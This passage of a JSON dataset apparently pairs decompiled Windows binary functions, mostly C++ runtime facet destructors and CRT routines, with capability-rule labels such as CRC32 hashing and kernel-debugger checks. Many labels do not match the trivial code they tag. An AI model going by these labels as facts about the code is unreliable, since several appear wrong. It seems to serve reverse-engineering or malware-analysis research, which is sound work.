        "decompiled_code": "\nvoid __cdecl fcn.004636c6(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "004636f1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004636f1(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00463790": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463790(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00405146();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "004657f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004657f7(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00405097();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00465821": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465821(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00404462();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00466adc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466adc(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0046dd6a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046dd6a(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00406956();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0046dd94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046dd94(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00402144();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0046ddbe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ddbe(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00403be3();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0046dde8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046dde8(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.0040522c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0046de12": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046de12(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046de3d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046de3d(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0046de68": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046de68(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046de93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046de93(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046debe": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046debe(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046dee9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046dee9(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046dff8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046dff8(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046e023": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e023(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046e04e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e04e(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0046e079": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e079(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046e0a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e0a4(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::numpunct_unsigned_short_int_.0;\n    fcn.0040645b();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0046e0dd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e0dd(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::numpunct_wchar_t_.0;\n    fcn.00404138();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0046e116": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e116(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = \n    vtable.std::time_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n    ;\n    fcn.00401825();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0046e14f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e14f(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::time_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n    ;\n    fcn.00402a81();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0046e188": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e188(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00401d20();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0046e1b2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e1b2(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00406019();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0046e1dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e1dc(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0046e207": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e207(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046e232": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046e232(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "004801b6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004801b6(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00406046();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "004801e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004801e0(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0048020b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048020b(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00480236": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480236(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "004802d3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004802d3(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::time_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n    fcn.00402022();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "0048030c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048030c(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00404e17();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a2d(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00489c1a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t __cdecl fcn.00489c1a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t *piVar8;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint uVar9;\n    uint var_4h;\n    \n    fcn.004022de(0x56f160, 0x10);\n    iVar7 = 0;\n    puVar1 = *(unaff_EBP + 0x10);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && (-1 < *puVar1)))) {\n        iVar7 = 0;\n        goto code_r0x00489d42;\n    }\n    uVar2 = *puVar1;\n    piVar8 = *(unaff_EBP + 0xc);\n    if (-1 < uVar2) {\n        piVar8 = piVar8 + puVar1[2] + 0xc;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar5 = *0x5743f0;\n    puVar3 = *(unaff_EBP + 0x14);\n    if (((uVar2 < '\\0') && ((*puVar3 & 0x10) != 0)) && (*(unaff_EBP + -0x1c) = *0x5743f0,  iVar5 != 0)) {\n        (**0x578000)();\n        iVar5 = (**(unaff_EBP + -0x1c))();\ncode_r0x00489c91:\n        if ((iVar5 == 0) || (piVar8 == NULL)) {\ncode_r0x00489d52:\n            fcn.00404f39();\n            pcVar4 = swi(3);\n            iVar7 = (*pcVar4)();\n            return iVar7;\n        }\n        *piVar8 = iVar5;\ncode_r0x00489ce1:\n        iVar5 = fcn.0040119f(iVar5, puVar3 + 8);\n        *piVar8 = iVar5;\n    }\n    else {\n        iVar5 = *(unaff_EBP + 8);\n        if ((uVar2 & 8) != 0) {\n            iVar5 = *(iVar5 + 0x18);\n            goto code_r0x00489c91;\n        }\n        if ((*puVar3 & 1) != 0) {\n            if ((*(iVar5 + 0x18) == 0) || (piVar8 == NULL)) goto code_r0x00489d52;\n            fcn.004059ac(piVar8, *(iVar5 + 0x18), *(puVar3 + 0x14));\n            if ((*(puVar3 + 0x14) != 4) || (*piVar8 == 0)) goto code_r0x00489d2c;\n            iVar5 = *piVar8;\n            goto code_r0x00489ce1;\n        }\n        iVar5 = *(iVar5 + 0x18);\n        if (*(puVar3 + 0x18) == 0) {\n            if ((iVar5 == 0) || (piVar8 == NULL)) goto code_r0x00489d52;\n            uVar9 = *(puVar3 + 0x14);\n            uVar6 = fcn.0040119f(iVar5, puVar3 + 8);\n            fcn.004059ac(piVar8, uVar6, uVar9);\n        }\n        else {\n            if ((iVar5 == 0) || (piVar8 == NULL)) goto code_r0x00489d52;\n            iVar7 = ((*puVar3 & 4) != 0) + 1;\n            *(unaff_EBP + -0x20) = iVar7;\n        }\n    }\ncode_r0x00489d2c:\n    *(unaff_EBP + -4) = 0xfffffffe;\ncode_r0x00489d42:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return iVar7;\n}\n",
        "token_count": 1034
    },
    "004953f2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004953f2(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        goto code_r0x00495547;\n    }\n    fcn.004058a8(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.004033af(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.004038f5();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x0049551f;\ncode_r0x0049556a:\n                    *(puVar1 + arg_14h + -1) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x0049556a;\n                    goto code_r0x0049551f;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x0049551f:\n            *(puVar1 + var_468h) = 0;\n        }\n    }\n    fcn.004046f6();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x00495547:\n    fcn.004030bc(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 808
    },
    "004955cf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004955cf(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        goto code_r0x0049572a;\n    }\n    fcn.004058a8(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00402b21(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.004044df();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x004956ff;\ncode_r0x0049574d:\n                    *(puVar1 + arg_14h * 2 + -2) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x0049574d;\n                    goto code_r0x004956ff;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x004956ff:\n            *(puVar1 + var_468h * 2) = 0;\n        }\n    }\n    fcn.004046f6();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x0049572a:\n    fcn.004030bc(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 812
    },
    "00495bfa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00495bfa(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        goto code_r0x00495d4f;\n    }\n    fcn.004058a8(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.004033af(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.0040427d();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x00495d27;\ncode_r0x00495d72:\n                    *(puVar1 + arg_14h + -1) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00495d72;\n                    goto code_r0x00495d27;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x00495d27:\n            *(puVar1 + var_468h) = 0;\n        }\n    }\n    fcn.004046f6();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x00495d4f:\n    fcn.004030bc(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 812
    },
    "00495dd7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00495dd7(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        goto code_r0x00495f32;\n    }\n    fcn.004058a8(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00402b21(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.00403012();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x00495f07;\ncode_r0x00495f55:\n                    *(puVar1 + arg_14h * 2 + -2) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00495f55;\n                    goto code_r0x00495f07;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x00495f07:\n            *(puVar1 + var_468h * 2) = 0;\n        }\n    }\n    fcn.004046f6();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x00495f32:\n    fcn.004030bc(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 816
    },
    "004d407a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.004d407a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f988, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x575488)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x575220) + 0x28 + iVar3) & 1) != 0) {\n                fcn.0040150a(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 